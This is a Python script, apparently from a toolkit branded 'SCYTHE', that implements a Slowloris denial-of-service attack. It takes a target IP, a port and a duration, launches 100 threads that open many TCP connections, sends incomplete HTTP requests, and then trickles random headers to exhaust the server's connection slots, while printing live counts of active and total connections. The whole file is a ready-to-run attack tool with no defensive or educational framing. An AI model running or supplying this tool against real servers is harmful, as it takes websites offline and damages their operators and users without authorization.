# SCYTHE Slowloris L4 v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 4: print('Usage: python3 slowloris.py <ip> <port> <time> [threads]'); sys.exit(1)
ip, port, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
print(f'[SCYTHE] Slowloris: {ip}:{port} | {duration}s')
active, total = 0, 0
lock = threading.Lock()
headers = [b'X-a: ', b'X-b: ', b'X-c: ', b'X-d: ']
def attack():
  global active, total
  end = time.time() + duration
  while time.time() < end:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(60); s.connect((ip, port))
      with lock: active += 1; total += 1
      s.send(b'GET / HTTP/1.1\r\n'); s.send(f'Host: {ip}\r\n'.encode())
      count = 0
      while time.time() < end and count < 1000:
        s.send(random.choice(headers) + str(random.random()).encode() + b'\r\n')
        count += 1; time.sleep(10 + random.random() * 5)
      s.close();
      with lock: active -= 1
    except:
      with lock:
        if active > 0: active -= 1
for _ in range(100):
  threading.Thread(target=attack, daemon=True).start()
start = time.time()
while time.time() - start < duration:
  print(f'[SLOWLORIS] Active: {active} | Total: {total} | Elapsed: {time.time()-start:.1f}s')
  time.sleep(2)
print(f'[SLOWLORIS] Completed: {total} connections')